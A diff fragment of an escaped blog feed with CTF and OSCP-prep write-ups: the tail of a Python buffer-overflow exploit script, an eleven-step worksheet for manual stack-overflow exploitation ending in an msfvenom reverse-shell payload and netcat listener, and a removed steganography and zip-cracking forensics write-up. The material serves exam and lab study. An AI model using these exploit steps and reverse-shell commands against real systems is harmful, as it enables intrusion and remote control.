+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sending evil buffer...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;latin-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Could not connect.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;a href=&quot;#toc&quot;&gt;Return to Table of Contents&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;div style=&quot;page-break-after: always; visibility: hidden&quot;&gt; \pagebreak &lt;/div&gt;
+
+&lt;h2 id=&quot;oscp-friendly-manual-bof-exploit-worksheet&quot;&gt;&lt;a name=&quot;worksheet&quot;&gt;&lt;/a&gt;OSCP Friendly Manual BOF Exploit Worksheet&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 1 - Open an RDP session to the target machine, if applicable then run the vulnerable application and fuzz to find the general range of the EIP register offset at the point of the application crashing.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 fuzzer.py&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;mark&gt;Crashed at &lt;input type=&quot;number&quot; id=&quot;estoffset&quot; name=&quot;estoffset&quot; value=&quot; &quot; /&gt; bytes. &lt;br /&gt; Add 400 to the value entered above: &lt;input type=&quot;number&quot; id=&quot;estoffsetplus&quot; name=&quot;estoffsetplus&quot; value=&quot; &quot; /&gt;&lt;br /&gt;(Substitute for XXXX in code segments below)&lt;/mark&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 2 - Create a pattern that’s 400 characters over the estimated offset via metasploit.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l XXXX&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 3 - Modify exploit script with the target ip and port, pattern as the payload, offset = 0, retn = “”, padding = “”, postfix = “”.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 4 - Open Immunity Debugger (running as admin) and load the vulnerable application, then use Mona to find the exact EIP offset.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona findmsp -distance XXXX&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;mark&gt;Exact Offset = &lt;input type=&quot;number&quot; id=&quot;offset&quot; name=&quot;offset&quot; value=&quot; &quot; /&gt; &lt;br /&gt;(Substitute for PPPP in code segments below)&lt;/mark&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 5 - Verify the offset value by updating and running exploit.py with no payload, the found offset value, and a return address string (“e.g. BCDE”) to check for EIP overwrite.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 exploit.py&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 6 - Use Mona to generate a bad character set, excluding \x00, update exploit.py then run it, noting the ESP register value.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona config -set workingfolder c:\mona\%p&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona bytearray -b &quot;\x00&quot;&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;mark&gt;ESP = 0x&lt;input type=&quot;text&quot; id=&quot;esp&quot; name=&quot;esp&quot; value=&quot; &quot; /&gt; &lt;br /&gt;(Substitute for YYYYYYYY in code segments below)&lt;/mark&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 7 - Use Mona to find possible bad characters with a comparison between the byte array and ESP.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona compare -f C:\mona\oscp\bytearray.bin -a YYYYYYYY&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;mark&gt;Bad Character Array = &quot;\x00\ &lt;input type=&quot;text&quot; id=&quot;badchars&quot; name=&quot;badchars&quot; value=&quot; &quot; /&gt;&lt;br /&gt;(Substitute for &quot;\x00\x??\x??\x??&quot; in code segments below)&lt;/mark&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 8 - Update the byte array and payload to exclude all possible bad characters, then run the exploit followed by a Mona comparison to find bad characters. Remove identified bad characters (ignoring the second of adjacent bytes that are flagged as bad, as this may not be the case) and repeat the process until all bad characters have been eliminated.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona bytearray -b &quot;\x00\x??\x??\x??&quot;&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 exploit.py&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;mark&gt;New ESP = 0x&lt;input type=&quot;text&quot; id=&quot;newesp&quot; name=&quot;newesp&quot; value=&quot; &quot; /&gt; &lt;br /&gt;(Substitute for ZZZZZZZZ in code segments below)&lt;/mark&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona compare -f C:\mona\oscp\bytearray.bin -a ZZZZZZZZ&lt;/code&gt; (Update the ESP address after each crash)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 9 - Find a JMP point using Mona and update the RETN variable in the exploit script accordingly.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mona jmp -r esp -cpb &quot;\x00\x??\x??\x??&quot;&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;mark&gt;Chosen return address = 0x&lt;input type=&quot;text&quot; id=&quot;retn&quot; name=&quot;retn&quot; value=&quot; &quot; /&gt; &lt;br /&gt;(Substitute for 0xTHISADDR in code segments below)&lt;/mark&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;retn = &quot;\xDR\xAD\xIS\xTH&quot;&lt;/code&gt; (Little Endian format for 0xTHISADDR)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 10 - Generate an MSF reverse shell payload (excluding all bad characters identified) and replace the payload value in exploit.py, along with NOP (\x90) padding of at least 16 bytes.&lt;/p&gt;
+
+    &lt;p&gt;&lt;mark&gt;Your IP Address = &lt;input type=&quot;text&quot; id=&quot;ipaddr&quot; name=&quot;ipaddr&quot; value=&quot;&quot; /&gt; &lt;br /&gt;(Substitute for 127.0.0.1 in code segments below)&lt;/mark&gt;&lt;br /&gt;&lt;br /&gt;
+  &lt;mark&gt;Your Listener Port = &lt;input type=&quot;text&quot; id=&quot;listener&quot; name=&quot;listener&quot; value=&quot;&quot; /&gt; &lt;br /&gt;(Substitute for 4444 in code segments below)&lt;/mark&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b &quot;\x00\x??\x??\??&quot; -f c&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;input type=&quot;checkbox&quot; unchecked=&quot;&quot; /&gt; Step 11 - Open up a Netcat listener and run the exploit for reverse shell.&lt;/p&gt;
+
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;#toc&quot;&gt;Return to Table of Contents&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;, &quot;resources&quot;]" /><category term="TryHackMe" /><summary type="html"></summary></entry><entry><title type="html">Dice Roll</title><link href="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll.html" rel="alternate" type="text/html" title="Dice Roll" /><published>2021-03-14T23:48:00-05:00</published><updated>2021-03-14T23:48:00-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Dice-Roll.html">&lt;h1&gt;&lt;/h1&gt;
 &lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt;Challenge Text&lt;/font&gt;&lt;/h3&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Author: @JohnHammond#6971
@@ -789,28 +1079,4 @@ Some people seem to have trouble reading this, understandably so. Sorry. The fla
                         &lt;span class=&quot;c1&quot;&gt;#print ('Array Entry Added:', new_array_entry, 'Index:', index)
 &lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_array_entry&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/eea3a0b7795f46d2ad0c16dc3b5a464e.png&quot; alt=&quot;0989ccb25f75075faa483cf4bde6b738.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Programming - Roll for Initiative 1</summary></entry><entry><title type="html">An Even Nicer Picture</title><link href="http://0.0.0.0:4000/writeups/2020/08/07/Defcon28RTVCTF-Nicer-Pic.html" rel="alternate" type="text/html" title="An Even Nicer Picture" /><published>2020-08-07T21:21:15-05:00</published><updated>2020-08-07T21:21:15-05:00</updated><id>http://0.0.0.0:4000/writeups/2020/08/07/Defcon28RTVCTF-Nicer-Pic</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2020/08/07/Defcon28RTVCTF-Nicer-Pic.html">&lt;p&gt;Forensics - An Even Nicer Picture&lt;/p&gt;
-
-&lt;p&gt;Trying the same method from the “A Nice Picture” challenge first:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/08b5bad066ee42c898fe71a40532993b.png&quot; alt=&quot;1e4483d70dd40bd252283f7d4444bce5.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;There doesn’t appear to be anything inside, but the file is clearly even larger than the first, identical picture, so let’s see what else we can do.  Exiftool doesn’t reveal anything in the metadata, so how about Steghide?&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/271a2b683ea2445f8d06ffabc17812c1.png&quot; alt=&quot;252bbc0187d77aae3eda19d1f4c37fe8.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing appears to show up, but maybe there’s a passphrase.  Using a tool called Stegcracker (installed via pip3; defaults to using /usr/share/wordlists/rockyou.txt):&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/a867e674f6c74744b34747584fb0c232.png&quot; alt=&quot;52494346a7fe98388403a804931e74b0.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Inspecting the output:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/c7c245f7832440d9b1d88763dad2ba1f.png&quot; alt=&quot;8da2e8f1c47650b285da9b3f90eee1bd.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Since the file starts with PK, this is a zip file.  So we rename it and try to open it up, finding that its password protected.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/40cccb9ff22445cc9ea763b0bb1c3b3b.png&quot; alt=&quot;694dbe167dc00d63991af8443b59eaa3.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This part is actually the exact same as the “A Nice Picture” problem (including the password), but running through the steps again, we can use fcrackzip using rockyou.txt as the wordlist here as well:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/b7c07f8cf88d4c8c82fc2041203906b0.png&quot; alt=&quot;51b9ac376c538407a14313cdc67d0f02.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Forensics - An Even Nicer Picture</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/eea3a0b7795f46d2ad0c16dc3b5a464e.png&quot; alt=&quot;0989ccb25f75075faa483cf4bde6b738.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Programming - Roll for Initiative 1</summary></entry></feed>
